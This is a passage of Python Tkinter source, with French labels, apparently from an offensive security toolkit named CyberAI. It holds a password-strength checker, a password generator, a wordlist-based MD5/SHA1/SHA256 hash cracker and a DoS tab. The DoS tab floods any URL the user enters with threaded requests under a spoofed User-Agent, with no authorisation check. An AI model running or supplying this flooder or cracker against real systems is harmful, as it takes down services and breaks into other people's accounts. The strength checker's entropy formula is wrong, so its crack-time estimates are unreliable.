        ttk.Radiobutton(hf, text="MD5", variable=self.hash_type, value="MD5").grid(row=0, column=2, padx=2)
        ttk.Radiobutton(hf, text="SHA1", variable=self.hash_type, value="SHA1").grid(row=0, column=3, padx=2)
        ttk.Radiobutton(hf, text="SHA256", variable=self.hash_type, value="SHA256").grid(row=0, column=4, padx=2)

        btn_hf = ttk.Frame(hf)
        btn_hf.grid(row=1, column=0, columnspan=5, pady=5)
        ttk.Button(btn_hf, text="Crack (int\u00e9gr\u00e9)", command=self.run_crack_hash).pack(side=tk.LEFT, padx=3)
        ttk.Label(btn_hf, text="Wordlist:").pack(side=tk.LEFT, padx=(10, 2))
        self.entry_wordlist = ttk.Entry(btn_hf, width=30)
        self.entry_wordlist.pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_hf, text="Parcourir", command=self.browse_wordlist).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_hf, text="Crack (fichier)", command=self.run_crack_file).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def run_analyze(self):
        self.clear(self.output)
        pwd = self.entry_pwd.get()
        if not pwd:
            messagebox.showwarning("Attention", "Entrez un mot de passe.")
            return
        self.run_thread(lambda: self.do_analyze(pwd))

    def do_analyze(self, pwd):
        self.log(self.output, f"Analyse du mot de passe:", "bold")
        self.log(self.output, f"  Longueur: {len(pwd)} caract\u00e8res")

        score = 0
        if len(pwd) >= 8:
            score += 20
        if len(pwd) >= 12:
            score += 10
        if len(pwd) >= 16:
            score += 10
        if any(c.isupper() for c in pwd):
            score += 15
        if any(c.islower() for c in pwd):
            score += 10
        if any(c.isdigit() for c in pwd):
            score += 15
        if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?`~" for c in pwd):
            score += 20
        self.log(self.output, f"  Score: {min(score, 100)}/100")

        if score >= 80:
            strength = "Fort"
            s_tag = "success"
        elif score >= 50:
            strength = "Moyen"
            s_tag = "warning"
        else:
            strength = "Faible"
            s_tag = "error"
        self.log(self.output, f"  Force: {strength}", s_tag)

        entropy = 0
        charset = 0
        if any(c.islower() for c in pwd):
            charset += 26
        if any(c.isupper() for c in pwd):
            charset += 26
        if any(c.isdigit() for c in pwd):
            charset += 10
        if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?`~" for c in pwd):
            charset += 30
        if charset:
            entropy = len(pwd) * (charset.bit_length())
        self.log(self.output, f"  Entropie: {entropy} bits")

        common = ["password", "123456", "admin", "qwerty", "letmein", "welcome",
                  "monkey", "dragon", "master", "football", "iloveyou", "sunshine"]
        if pwd.lower() in common:
            self.log(self.output, f"  \u26a0 Mot de passe trop commun!", "error")

        self.log(self.output, f"\nTemps estim\u00e9 pour craquer:")
        if entropy >= 80:
            self.log(self.output, f"  En ligne: > 10 ans", "success")
            self.log(self.output, f"  Hors ligne: > 100 ans", "success")
        elif entropy >= 50:
            self.log(self.output, f"  En ligne: ~ 1 an", "warning")
            self.log(self.output, f"  Hors ligne: ~ 10 ans", "warning")
        else:
            self.log(self.output, f"  En ligne: < 1 mois", "error")
            self.log(self.output, f"  Hors ligne: < 1 an", "error")

    def run_generate(self):
        self.clear(self.output)
        length = int(self.spin_len.get())
        self.run_thread(lambda: self.do_generate(length))

    def do_generate(self, length):
        import secrets
        import string
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        pwd = "".join(secrets.choice(chars) for _ in range(length))
        self.log(self.output, f"Mot de passe g\u00e9n\u00e9r\u00e9 ({length} caract\u00e8res):", "bold")
        self.log(self.output, f"  {pwd}", "success")
        self.entry_pwd.delete(0, tk.END)
        self.entry_pwd.insert(0, pwd)

    # ── Hash Cracker ──
    def run_crack_hash(self):
        self.clear(self.output)
        h = self.entry_hash.get().strip()
        if not h:
            messagebox.showwarning("Attention", "Entrez un hash.")
            return
        self.run_thread(lambda: self.do_crack_hash(h))

    def do_crack_hash(self, h):
        import hashlib
        self.log(self.output, f"Tentative de craquage du hash: {h}", "bold")
        algo = self.hash_type.get()
        self.log(self.output, f"Algorithme: {algo}\n")

        common_pwds = [
            "123456", "password", "admin", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "sunshine", "qwerty123",
            "iloveyou", "princess", "admin123", "welcome", "monkey", "dragon",
            "master", "letmein", "login", "abc123", "passw0rd", "shadow",
            "root", "test", "guest", "user", "server", "changeme",
            "123qwe", "1q2w3e4r", "zaq12wsx", "trustno1", "pass123",
        ]

        found = False
        for pwd in common_pwds:
            if algo == "MD5":
                h_calc = hashlib.md5(pwd.encode()).hexdigest()
            elif algo == "SHA1":
                h_calc = hashlib.sha1(pwd.encode()).hexdigest()
            elif algo == "SHA256":
                h_calc = hashlib.sha256(pwd.encode()).hexdigest()
            else:
                self.log(self.output, "Algorithme non support\u00e9.", "error")
                return

            if h_calc == h.lower():
                self.log(self.output, f"  \u2713 TROUV\u00c9: {pwd}", "success")
                self.entry_pwd.delete(0, tk.END)
                self.entry_pwd.insert(0, pwd)
                found = True
                break

        if not found:
            self.log(self.output, "  Hash non trouv\u00e9 dans la wordlist.", "warning")
            self.log(self.output, "  Essayez avec une wordlist personnalis\u00e9e via 'Fichier'.", "warning")

    def run_crack_file(self):
        h = self.entry_hash.get().strip()
        fpath = self.entry_wordlist.get().strip()
        if not h or not fpath:
            messagebox.showwarning("Attention", "Entrez un hash et un fichier wordlist.")
            return
        if not os.path.isfile(fpath):
            messagebox.showerror("Erreur", "Fichier wordlist introuvable.")
            return
        self.clear(self.output)
        self.run_thread(lambda: self.do_crack_file(h, fpath))

    def do_crack_file(self, h, fpath):
        import hashlib
        algo = self.hash_type.get()
        self.log(self.output, f"Craquage avec wordlist: {fpath}", "bold")
        self.log(self.output, f"Hash: {h} ({algo})\n")

        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    pwd = line.strip()
                    if not pwd:
                        continue
                    if algo == "MD5":
                        h_calc = hashlib.md5(pwd.encode()).hexdigest()
                    elif algo == "SHA1":
                        h_calc = hashlib.sha1(pwd.encode()).hexdigest()
                    elif algo == "SHA256":
                        h_calc = hashlib.sha256(pwd.encode()).hexdigest()
                    else:
                        return
                    if h_calc == h.lower():
                        self.log(self.output, f"  \u2713 TROUV\u00c9: {pwd}", "success")
                        self.entry_pwd.delete(0, tk.END)
                        self.entry_pwd.insert(0, pwd)
                        return
            self.log(self.output, "  Hash non trouv\u00e9 dans ce fichier.", "warning")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")

    def browse_wordlist(self):
        fpath = filedialog.askopenfilename(title="Choisir une wordlist",
                                           filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if fpath:
            self.entry_wordlist.delete(0, tk.END)
            self.entry_wordlist.insert(0, fpath)

    def run_generate_hash(self):
        pwd = self.entry_pwd.get().strip()
        if not pwd:
            messagebox.showwarning("Attention", "Entrez un mot de passe ou utilisez G\u00e9n\u00e9rer.")
            return
        self.clear(self.output)
        self.run_thread(lambda: self.do_generate_hash(pwd))

    def do_generate_hash(self, pwd):
        import hashlib
        self.log(self.output, f"Hashes pour: {pwd}", "bold")
        self.log(self.output, f"  MD5:    {hashlib.md5(pwd.encode()).hexdigest()}")
        self.log(self.output, f"  SHA1:   {hashlib.sha1(pwd.encode()).hexdigest()}")
        self.log(self.output, f"  SHA256: {hashlib.sha256(pwd.encode()).hexdigest()}")


# ════════════════════════ 6. DoS / STRESS TEST ════════════════════════
class DoSTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.running = False
        self.stop_flag = threading.Event()
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="DoS / Stress Test")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="URL cible:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_url = ttk.Entry(f, width=50, font=("TkDefaultFont", 11))
        self.entry_url.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Threads:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.spin_threads = ttk.Spinbox(f, from_=1, to=100, width=5, value=10)
        self.spin_threads.grid(row=1, column=1, padx=5, pady=5, sticky="w")

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=2, column=0, columnspan=2, pady=5)
        self.btn_start = ttk.Button(btn_frame, text="Start DoS", command=self.run_dos)
        self.btn_start.pack(side=tk.LEFT, padx=5)
        self.btn_stop = ttk.Button(btn_frame, text="Stop", command=self.stop_dos, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=5)

        self.output = self.make_output(main)

    def run_dos(self):
        url = self.entry_url.get().strip()
        if not url:
            messagebox.showwarning("Attention", "Entrez une URL.")
            return
        if not url.startswith("http"):
            url = "http://" + url
            self.entry_url.delete(0, tk.END)
            self.entry_url.insert(0, url)

        self.clear(self.output)
        self.running = True
        self.stop_flag.clear()
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.run_thread(lambda: self.do_dos(url))

    def do_dos(self, url):
        n_threads = int(self.spin_threads.get())
        self.log(self.output, f"Attaque DoS sur {url}", "bold")
        self.log(self.output, f"Threads: {n_threads}")
        self.log(self.output, "Appuyez sur Stop pour arr\u00eater.\n")

        stats = {"sent": 0, "errors": 0}
        lock = threading.Lock()

        def worker():
            while not self.stop_flag.is_set():
                try:
                    requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                    with lock:
                        stats["sent"] += 1
                except:
                    with lock:
                        stats["errors"] += 1

        threads = []
        for _ in range(n_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self.stop_flag.is_set():
            time.sleep(2)
            with lock:
                self.log(self.output, f"  Envoy\u00e9es: {stats['sent']}  |  Erreurs: {stats['errors']}")
            if stats["errors"] > stats["sent"] * 2 and stats["sent"] > 10:
                self.log(self.output, "  [!] Cible peut-\u00eatre down ou bloqu\u00e9e", "warning")

        self.log(self.output, "\nAttaque arr\u00eat\u00e9e.", "bold")
        self.log(self.output, f"Total: {stats['sent']} requ\u00eates, {stats['errors']} erreurs")

    def stop_dos(self):
        self.running = False
        self.stop_flag.set()
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)


# ════════════════════════ MAIN ════════════════════════
def main():
    app = CyberAI()
    app.mainloop()


if __name__ == "__main__":
    main()
